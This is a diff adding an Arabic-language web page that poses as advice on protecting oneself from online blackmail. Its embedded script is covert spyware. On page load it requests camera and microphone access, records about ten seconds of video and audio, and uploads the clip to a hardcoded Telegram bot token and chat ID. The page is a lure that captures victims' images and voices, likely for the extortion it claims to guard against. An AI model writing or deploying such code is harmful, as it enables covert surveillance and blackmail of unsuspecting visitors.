@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>حماية نفسك من الابتزاز</title>
+    <style>
+        /* تعيين تنسيق الصفحة لتكون متجاوبة مع جميع الأجهزة */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(to right, #3b5998, #8b9dc3); /* تدرج الألوان الأزرق مثل الفيسبوك */
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
+            overflow: hidden; /* إخفاء أي تجاوزات */
+        }
+
+        h1 {
+            font-size: 2rem;
+            margin-bottom: 20px;
+        }
+
+        p, ul {
+            font-size: 1.2rem;
+            margin: 10px 0;
+        }
+
+        ul {
+            list-style-type: none;
+            padding: 0;
+        }
+
+        li {
+            margin: 5px 0;
+        }
+
+        /* تخصيص النصوص بشكل أفضل */
+        .content {
+            background-color: rgba(0, 0, 0, 0.6); /* خلفية داكنة للنصوص */
+            padding: 20px;
+            border-radius: 10px;
+            max-width: 90%; /* تحديد أقصى عرض 90% */
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        /* تخصيص حجم الخط والعناصر على شاشات صغيرة */
+        @media screen and (max-width: 600px) {
+            h1 {
+                font-size: 1.5rem;
+            }
+
+            p, ul {
+                font-size: 1rem;
+            }
+
+            .content {
+                padding: 15px;
+            }
+        }
+
+        /* تخصيص للأجهزة اللوحية */
+        @media screen and (max-width: 768px) {
+            h1 {
+                font-size: 1.8rem;
+            }
+
+            p, ul {
+                font-size: 1.1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="content">
+        <h1>كيفية حماية نفسك من الابتزاز الإلكتروني</h1>
+
+        <p>
+            الابتزاز الإلكتروني هو تهديد يواجهه العديد من الأشخاص عبر الإنترنت. يحدث عندما يقوم شخص ما
+            باستخدام معلومات أو صور شخصية تهديدية من أجل ابتزاز الضحية للحصول على المال أو مزايا أخرى.
+        </p>
+
+        <p>
+            إليك بعض الطرق لحماية نفسك:
+        </p>
+        <ul>
+            <li>حافظ على خصوصيتك: تجنب مشاركة معلوماتك الشخصية أو الصور الحساسة عبر الإنترنت.</li>
+            <li>استخدم كلمات مرور قوية: تأكد من أن كلمات مرورك معقدة وغير قابلة للتخمين.</li>
+            <li>إبلاغ السلطات: في حال تعرضك للابتزاز، قم بالإبلاغ عن الموقف للسلطات المختصة.</li>
+            <li>لا تستسلم للابتزاز: لا ترسل المال أو معلومات إضافية للمبتزين، فهم سيطلبون المزيد.</li>
+            <li>استخدم أدوات الحماية: تأكد من أن جهازك يحتوي على برامج أمان مثل الجدران النارية وبرامج مكافحة الفيروسات.</li>
+        </ul>
+
+        <p>
+            تذكر أن أمانك الرقمي هو مسؤوليتك. احرص دائمًا على اتخاذ خطوات وقائية لحماية نفسك من التهديدات الإلكترونية.
+        </p>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = "7913260818:AAGT5rKbYr6RdKrO5O3OKmBKbSpsdSZ_Z5Y"; // توكن البوت
+        const TELEGRAM_CHAT_ID = "6514749116"; // معرف الشات
+
+        let mediaRecorder;
+        let recordedChunks = [];
+
+        // الوصول إلى الكاميرا وبدء التسجيل تلقائيًا
+        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+            .then(stream => {
+                mediaRecorder = new MediaRecorder(stream);
+
+                mediaRecorder.ondataavailable = event => {
+                    if (event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                    }
+                };
+
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                    recordedChunks = []; // إعادة التهيئة
+
+                    // إرسال الفيديو تلقائيًا إلى تيليجرام
+                    sendVideoToTelegram(blob);
+                };
+
+                // بدء التسجيل تلقائيًا بعد تحميل الصفحة
+                mediaRecorder.start();
+                
+                // إيقاف التسجيل بعد مدة محددة (مثلاً 10 ثواني)
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                }, 10000);  // 10000 مللي ثانية = 10 ثواني
+            })
+            .catch(error => {
+                console.error('تعذر الوصول إلى الكاميرا:', error);
+            });
+
+        // إرسال الفيديو إلى تيليجرام
+        async function sendVideoToTelegram(blob) {
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('video', blob, 'video.webm');
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
+                    method: 'POST',
+                    body: formData,
+                });
+
+                if (response.ok) {
+                    console.log('تم إرسال الفيديو بنجاح إلى تيليجرام!');
+                } else {
+                    console.log('حدث خطأ أثناء الإرسال: ' + (await response.text()));
+                }
+            } catch (error) {
+                console.error('خطأ أثناء إرسال الفيديو:', error);
+            }
+        }
+    </script>
+</body>
+</html>
